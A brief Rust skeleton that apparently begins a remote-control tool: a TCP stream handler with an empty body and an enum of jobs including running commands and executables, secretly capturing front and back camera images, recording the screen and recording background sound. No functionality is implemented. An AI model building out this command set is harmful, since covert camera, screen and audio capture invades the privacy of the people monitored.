use std::{
    io::{self, BufReader, BufWriter, Write},
    net::{TcpListener, TcpStream},
};

enum JobType {
    AccessFile,
    RenameFile,
    DeleteFile,
    UpdateFile,
    MoveFile,
    CopyFile,
    CreateSymbolicLink,
    ExecuteExe,
    ExecuteCmd,
    AccessFrontCamera,
    AccessBackCamera,
    ReadScreen,
    RecordScreen,
    RecordBackgroundSound,
    CapturePhotoFront,
    CapturePhotoBack,
    CapturePhotoAny,
}

fn demo(stream: TcpStream) -> io::Result<()> {
    let reader = BufReader::new(&stream);
    let writer = BufWriter::new(&stream);
    dd(reader, writer);
    Ok(())
}

fn dd<'a>(a: BufReader<&'a TcpStream>, b: BufWriter<&'a TcpStream>) {}
